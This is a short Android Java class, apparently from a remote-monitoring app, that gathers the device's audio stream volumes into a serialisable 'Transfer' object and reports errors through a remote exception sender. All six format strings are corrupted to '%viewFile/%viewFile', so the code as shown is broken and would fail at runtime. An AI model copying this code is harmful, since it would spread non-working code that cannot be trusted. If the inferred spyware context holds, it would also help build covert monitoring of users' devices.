package Transfer;

import android.content.Context;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;

public class AudioManager implements Serializable {

  public String ALARM;
  public String MUSIC;
  public String NOTIFICATION;
  public String RING;
  public String SYSTEM;
  public String VOICECALL;

  public AudioManager() {
    try {
      android.media.AudioManager audioManager =
          (android.media.AudioManager) MyService.context.getSystemService(Context.AUDIO_SERVICE);
      ALARM = String.format("%viewFile/%viewFile", audioManager.getStreamVolume(4),
          audioManager.getStreamMaxVolume(4));
      MUSIC = String.format("%viewFile/%viewFile", audioManager.getStreamVolume(3),
          audioManager.getStreamMaxVolume(3));
      NOTIFICATION = String.format("%viewFile/%viewFile", audioManager.getStreamVolume(5),
          audioManager.getStreamMaxVolume(5));
      RING = String.format("%viewFile/%viewFile", audioManager.getStreamVolume(2),
          audioManager.getStreamMaxVolume(2));
      SYSTEM = String.format("%viewFile/%viewFile", audioManager.getStreamVolume(1),
          audioManager.getStreamMaxVolume(1));
      VOICECALL = String.format("%viewFile/%viewFile", audioManager.getStreamVolume(0),
          audioManager.getStreamMaxVolume(0));
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
